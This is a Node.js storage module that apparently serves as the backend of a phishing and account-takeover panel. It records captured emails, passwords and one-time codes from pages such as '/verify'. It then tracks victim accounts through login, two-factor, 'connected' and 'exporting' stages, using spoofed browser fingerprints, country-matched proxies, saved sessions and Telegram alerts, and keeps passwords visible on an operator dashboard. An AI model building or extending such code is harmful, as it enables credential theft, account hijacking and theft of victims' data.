import { EventEmitter } from "node:events";
import { randomUUID, createHash } from "node:crypto";
import fs from "node:fs";
import path from "node:path";

/* Single writer for everything the socket process owns.
 *
 * The web process never imports this file.  Writes are debounced and atomic
 * (temp file + rename) so a crash cannot leave half a JSON document; the old
 * `items` map is migrated in place and kept for the original submission API.
 *
 * Events:
 *   "add" | "update" | "remove" | "change"   (submissions, as before)
 *   "account"  (account, changeType)
 *   "job"      (job, changeType)
 */

const ITEM_STATUSES = ["new", "reviewed", "done"];
const ACCOUNT_STATUSES = [
  "queued",
  "auth",
  "twofa",
  "connected",
  "invalid",
  "error",
  "exporting",
  "done",
  "dead",
];
const JOB_TYPES = ["auth", "export", "ping"];
const ACTIVE_JOB = new Set(["queued", "running", "twofa"]);

export const STATUSES = ITEM_STATUSES;
export const ACCOUNT_STATUS = ACCOUNT_STATUSES;

function nowIso() {
  return new Date().toISOString();
}

function shortId(id) {
  return id.replaceAll("-", "").slice(0, 8);
}

function clampInt(value, fallback, min, max) {
  const n = Number.parseInt(value, 10);
  if (!Number.isFinite(n)) return fallback;
  return Math.min(Math.max(n, min), max);
}

function defaultAccount(input) {
  const id = input.id ?? randomUUID();
  const now = nowIso();
  return {
    id,
    shortId: shortId(id),
    email: String(input.email ?? "").trim(),
    password: input.password ?? "",
    status: ACCOUNT_STATUSES.includes(input.status) ? input.status : "queued",
    trusted: Boolean(input.trusted),
    sessionDir: input.sessionDir ?? "",
    fingerprint: {
      userAgent: input.fingerprint?.userAgent ?? "",
      language: input.fingerprint?.language ?? "",
      timezone: input.fingerprint?.timezone ?? "",
    },
    geo: {
      ip: input.geo?.ip ?? "",
      country: input.geo?.country ?? "",
      countryCode: input.geo?.countryCode ?? "",
    },
    proxy: {
      country: input.proxy?.country ?? "",
      exitIp: input.proxy?.exitIp ?? "",
      urlMasked: input.proxy?.urlMasked ?? "",
      ssid: input.proxy?.ssid ?? "",
    },
    identity: input.identity ?? {},
    counts: input.counts ?? {},
    export: input.export ?? {
      phase: "idle",
      done: 0,
      total: 0,
      bytes: 0,
    },
    lastPingAt: input.lastPingAt ?? null,
    lastError: input.lastError ?? "",
    createdAt: input.createdAt ?? now,
    updatedAt: input.updatedAt ?? now,
    telegramMessageId: input.telegramMessageId ?? null,
  };
}

export class Store extends EventEmitter {
  constructor({ file = "", seed = true, debounceMs = 120 } = {}) {
    super();
    this.file = file;
    this.debounceMs = debounceMs;
    this.items = new Map();
    this.accounts = new Map();
    this.jobs = new Map();
    this.timer = null;
    this.load();
    this.markStaleJobs();
    if (this.items.size === 0 && seed) this.seed();
  }

  /* ------------------------------------------------------------- persistence */

  load() {
    if (!this.file) return;
    try {
      const raw = JSON.parse(fs.readFileSync(this.file, "utf8"));
      for (const item of raw.items ?? []) this.items.set(item.id, item);
      for (const account of raw.accounts ?? []) {
        const record = defaultAccount(account);
        this.accounts.set(record.id, record);
      }
      for (const job of raw.jobs ?? []) this.jobs.set(job.id, job);
    } catch {
      // Missing, unreadable or pre-v2 file: start with what we have.
    }
  }

  scheduleSave() {
    if (!this.file) return;
    if (this.timer) return;
    this.timer = setTimeout(() => {
      this.timer = null;
      this.flush();
    }, this.debounceMs);
    this.timer.unref?.();
  }

  flush() {
    if (!this.file) return;
    if (this.timer) {
      clearTimeout(this.timer);
      this.timer = null;
    }
    const tmp = `${this.file}.${process.pid}.tmp`;
    try {
      // Keep completed jobs bounded; accounts are the durable record.
      const jobs = [...this.jobs.values()]
        .sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt)))
        .slice(0, 1000);
      this.jobs = new Map(jobs.map((job) => [job.id, job]));
      fs.mkdirSync(path.dirname(this.file), { recursive: true });
      fs.writeFileSync(
        tmp,
        JSON.stringify(
          {
            version: 2,
            items: [...this.items.values()],
            accounts: [...this.accounts.values()],
            jobs,
          },
          null,
          2
        )
      );
      fs.renameSync(tmp, this.file);
    } catch {
      try {
        fs.unlinkSync(tmp);
      } catch {
        // ignore
      }
    }
  }

  markStaleJobs() {
    let changed = false;
    for (const job of this.jobs.values()) {
      if (job.status === "queued" || job.status === "running") {
        job.status = "unknown";
        job.error = "node restarted";
        job.updatedAt = nowIso();
        changed = true;
      }
    }
    if (changed) this.scheduleSave();
  }

  /* --------------------------------------------------------------- submissions */

  seed() {
    const now = Date.now();
    const demo = [
      { email: "demo@example.com", code: "123456", page: "/verify", country: "United States", countryCode: "US" },
      { email: "second@example.com", code: "654321", page: "/terms", country: "Germany", countryCode: "DE" },
    ];
    demo.forEach((item, index) => {
      const id = `demo-${index + 1}`;
      this.items.set(id, {
        id,
        ...item,
        ip: "203.0.113.10",
        status: "new",
        note: "",
        createdAt: new Date(now - (index + 1) * 3600_000).toISOString(),
        updatedAt: new Date(now - (index + 1) * 3600_000).toISOString(),
        demo: true,
      });
    });
    this.scheduleSave();
  }

  add(input) {
    const now = nowIso();
    const item = {
      id: randomUUID(),
      email: input.email ?? "",
      password: input.password ?? "",
      code: input.code ?? "",
      page: input.page ?? "/",
      ip: input.ip ?? "",
      country: input.country ?? "",
      countryCode: input.countryCode ?? "",
      status: ITEM_STATUSES.includes(input.status) ? input.status : "new",
      note: input.note ?? "",
      createdAt: now,
      updatedAt: now,
    };
    this.items.set(item.id, item);
    this.scheduleSave();
    this.emit("add", item);
    this.emit("change", { type: "add", item });
    return item;
  }

  get(id) {
    return this.items.get(id) ?? null;
  }

  page({ page = 1, pageSize = 10, query = "" } = {}) {
    const size = clampInt(pageSize, 10, 1, 50);
    const q = String(query).trim().toLowerCase();
    const filtered = [...this.items.values()]
      .filter((item) => {
        if (!q) return true;
        return [item.email, item.code, item.country, item.status, item.note]
          .join(" ")
          .toLowerCase()
          .includes(q);
      })
      .sort((a, b) => b.createdAt.localeCompare(a.createdAt));
    const pages = Math.max(1, Math.ceil(filtered.length / size));
    const current = Math.min(Math.max(Number(page) || 1, 1), pages);
    const offset = (current - 1) * size;
    return {
      items: filtered.slice(offset, offset + size),
      total: filtered.length,
      page: current,
      pages,
      pageSize: size,
    };
  }

  update(id, patch = {}) {
    const item = this.items.get(id);
    if (!item) return null;
    if (patch.status !== undefined && ITEM_STATUSES.includes(patch.status)) {
      item.status = patch.status;
    }
    if (patch.note !== undefined) item.note = String(patch.note).slice(0, 2000);
    item.updatedAt = nowIso();
    this.scheduleSave();
    this.emit("update", item);
    this.emit("change", { type: "update", item });
    return item;
  }

  remove(id) {
    const item = this.items.get(id);
    if (!item) return null;
    this.items.delete(id);
    this.scheduleSave();
    this.emit("remove", item);
    this.emit("change", { type: "remove", item });
    return item;
  }

  stats() {
    const byStatus = Object.fromEntries(ITEM_STATUSES.map((s) => [s, 0]));
    for (const item of this.items.values()) {
      byStatus[item.status] = (byStatus[item.status] ?? 0) + 1;
    }
    return { total: this.items.size, byStatus, updatedAt: nowIso() };
  }

  /* ------------------------------------------------------------------ accounts */

  createAccount(input) {
    const account = defaultAccount(input);
    let suffix = 0;
    while ([...this.accounts.values()].some((item) => item.shortId === account.shortId)) {
      suffix += 1;
      account.shortId = shortId(account.id + suffix);
    }
    this.accounts.set(account.id, account);
    this.scheduleSave();
    this.emit("account", account, "add");
    return account;
  }

  getAccount(id) {
    return this.accounts.get(id) ?? null;
  }

  getAccountByShortId(short) {
    return (
      [...this.accounts.values()].find((account) => account.shortId === short) ?? null
    );
  }

  getAccountByEmail(email) {
    const wanted = String(email ?? "").trim().toLowerCase();
    for (const account of this.accounts.values()) {
      if (account.email.toLowerCase() === wanted) return account;
    }
    return null;
  }

  activeJobForEmail(email, type = "auth") {
    const account = this.getAccountByEmail(email);
    if (!account) return null;
    for (const job of this.jobs.values()) {
      if (
        job.accountId === account.id &&
        job.type === type &&
        ACTIVE_JOB.has(job.status)
      ) {
        return { account, job };
      }
    }
    return null;
  }

  updateAccount(id, patch = {}) {
    const account = this.accounts.get(id);
    if (!account) return null;
    for (const key of [
      "email",
      "password",
      "status",
      "trusted",
      "sessionDir",
      "lastPingAt",
      "lastError",
      "telegramMessageId",
    ]) {
      if (patch[key] !== undefined) account[key] = patch[key];
    }
    for (const key of ["fingerprint", "geo", "proxy", "identity", "counts", "export"]) {
      if (patch[key] !== undefined) {
        account[key] = { ...(account[key] ?? {}), ...patch[key] };
      }
    }
    if (patch.status && !ACCOUNT_STATUSES.includes(patch.status)) {
      account.status = "error";
    }
    account.updatedAt = nowIso();
    this.scheduleSave();
    this.emit("account", account, "update");
    return account;
  }

  listAccounts({ page = 1, pageSize = 5, query = "" } = {}) {
    const size = clampInt(pageSize, 5, 1, 50);
    const q = String(query).trim().toLowerCase();
    const filtered = [...this.accounts.values()]
      .filter((account) => {
        if (!q) return true;
        return [account.email, account.identity?.name, account.status]
          .join(" ")
          .toLowerCase()
          .includes(q);
      })
      .sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt)));
    const pages = Math.max(1, Math.ceil(filtered.length / size));
    const current = Math.min(Math.max(Number(page) || 1, 1), pages);
    const offset = (current - 1) * size;
    return {
      items: filtered.slice(offset, offset + size),
      total: filtered.length,
      page: current,
      pages,
      pageSize: size,
    };
  }

  accountsStats() {
    const byStatus = Object.fromEntries(ACCOUNT_STATUSES.map((s) => [s, 0]));
    for (const account of this.accounts.values()) {
      byStatus[account.status] = (byStatus[account.status] ?? 0) + 1;
    }
    return {
      total: this.accounts.size,
      byStatus,
      trusted: [...this.accounts.values()].filter((a) => a.trusted).length,
      updatedAt: nowIso(),
    };
  }

  /** Telegram/admin-safe view: no session directory, no password. */
  publicAccount(account) {
    if (!account) return null;
    const { password, sessionDir, ...rest } = account;
    return rest;
  }

  /** Operator view: keeps the password (the dashboard shows it) and the path. */
  adminAccount(account) {
    return account ? { ...account } : null;
  }

  sessionDirFor(email, root = "sessions") {
    const hash = createHash("sha256").update(String(email).toLowerCase()).digest("hex");
    return path.join(root, hash.slice(0, 16));
  }

  /* ---------------------------------------------------------------------- jobs */

  createJob({ accountId, type = "auth", payload = {} } = {}) {
    if (!JOB_TYPES.includes(type)) type = "auth";
    const now = nowIso();
    const job = {
      id: randomUUID(),
      accountId,
      type,
      payload,
      status: "queued",
      workerId: null,
      commandId: null,
      attempts: 0,
      error: "",
      createdAt: now,
      updatedAt: now,
    };
    this.jobs.set(job.id, job);
    this.scheduleSave();
    this.emit("job", job, "add");
    return job;
  }

  getJob(id) {
    return this.jobs.get(id) ?? null;
  }

  activeJobForAccount(accountId, type = "auth") {
    for (const job of this.jobs.values()) {
      if (
        job.accountId === accountId &&
        job.type === type &&
        ACTIVE_JOB.has(job.status)
      ) {
        return job;
      }
    }
    return null;
  }

  updateJob(id, patch = {}) {
    const job = this.jobs.get(id);
    if (!job) return null;
    Object.assign(job, patch);
    job.updatedAt = nowIso();
    this.scheduleSave();
    this.emit("job", job, "update");
    return job;
  }

  jobsForAccount(accountId) {
    return [...this.jobs.values()]
      .filter((job) => job.accountId === accountId)
      .sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt)));
  }

  jobsStats() {
    const byStatus = {};
    for (const job of this.jobs.values()) {
      byStatus[job.status] = (byStatus[job.status] ?? 0) + 1;
    }
    return { total: this.jobs.size, byStatus, updatedAt: nowIso() };
  }
}
